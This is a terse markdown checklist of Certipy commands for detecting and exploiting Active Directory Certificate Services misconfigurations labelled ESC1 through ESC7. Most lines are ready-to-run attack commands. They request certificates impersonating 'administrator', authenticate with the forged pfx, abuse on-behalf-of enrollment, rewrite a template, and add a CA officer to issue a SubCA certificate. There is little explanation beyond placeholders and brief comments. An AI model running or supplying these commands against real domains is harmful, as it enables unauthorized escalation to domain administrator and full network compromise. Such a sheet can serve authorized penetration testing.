
[certipy](https://github.com/ly4k/Certipy)

---
## ESC1

** DETECT **

- [ ] `certipy find -u 'test@domain.local' -p 'superpassword' -dc-ip <DC_IP> -vulnerable`

** EXPLOITATION **

- [ ] `certipy req -u'test@domain.local' -p 'superpassword' -target-ip <TARGET_IP> -ca 'CA_NAME' -template 'TEMPLATE_NAME' -upn 'administrator@domain.local'`
- [ ] `certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.local' -dc-ip <DC_IP>`
---
## ESC2

** DETECT **

- [ ] `certipy find -u 'test@domain.local' -p 'superpassword' -dc-ip <DC_IP> -vulnerable`

** EXPLOITATION **

- [ ] `certipy req -u test@domain.local -p 'superpassword' -ca 'CA_NAME' -template 'TEMPLATE_NAME' -dc-ip <DC_IP>`
- [ ] `certipy req -u test@domain.local -p 'superpassword' -ca 'CA_NAME' -template 'TEMPLATE_NAME' -dc-ip <DC_IP> -on-behalf-of 'domain\user' -pfx test.pfx`
---
## ESC3

** DETECT **

- [ ] `certipy find -u 'test@domain.local' -p 'superpassword' -dc-ip <DC_IP> -vulnerable`

** EXPLOITATION **

- [ ] `certipy req -u test@domain.local -p 'superpassword' -ca 'CA_NAME' -template 'TEMPLATE_NAME' -dc-ip <DC_IP>`
- [ ] `certipy req -u test@domain.local -p 'superpassword' -ca 'CA_NAME' -template 'TEMPLATE_NAME' -dc-ip <DC_IP> -on-behalf-of 'domain\user' -pfx test.pfx`
---
## ESC4

** DETECT **

- [ ] `certipy find -u 'test@domain.local' -p 'superpassword' -dc-ip <DC_IP> -vulnerable`

** EXPLOITATION **
*makes the template open to esc1 (don't forget -save-old!)*
- [ ] `certipy template -u test@domain.local -p 'superpassword'  -template 'TEMPLATE_NAME' -save-old`
---
## ESC6 

** DETECT **

- [ ] `certipy find -u 'test@domain.local' -p 'superpassword' -dc-ip <DC_IP> -vulnerable`

** EXPLOITATION **

- [ ] `certipy req -u'test@domain.local' -p 'superpassword' -target-ip <TARGET_IP> -ca 'CA_NAME' -template 'TEMPLATE_NAME' -upn 'administrator@domain.local'`
- [ ] `certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.local' -dc-ip <DC_IP>`

---
## ESC7

** DETECT **

- [ ] `certipy find -u 'test@domain.local' -p 'superpassword' -dc-ip <DC_IP> -vulnerable`

** EXPLOITATION **

- [ ] `certipy ca -u 'test@domain.local' -p 'superpassword' -ca <ca-name> -add-officer <officer>`
- [ ] `certipy ca -u 'test@domain.local' -p 'superpassword' -ca <ca-name> -dc-ip <DC_IP> -enable-template subca`
- [ ] `certipy ca -u 'test@domain.local' -p 'superpassword' -ca <ca-name> -dc-ip <DC_IP> -list-templates'` // *check template*
- [ ] `certipy req -u 'test@domain.local' -p 'superpassword' -ca <ca-name> -target dc01.domain.local -template SubCA -upn administrator@domain.local'` // *note request ID*
- [ ] `certipy ca -u test@domain.local -p 'superpassword' -ca <ca-name> -issue-request <request-ID>`
- [ ] `certipy req -u test@domain.local -p 'superpassword' -ca <ca-name> -target dc01.domain.local -retrieve <request-ID>`
- [ ] `certipy auth -pfx administrator.pfx -dc-ip <DC_IP>`





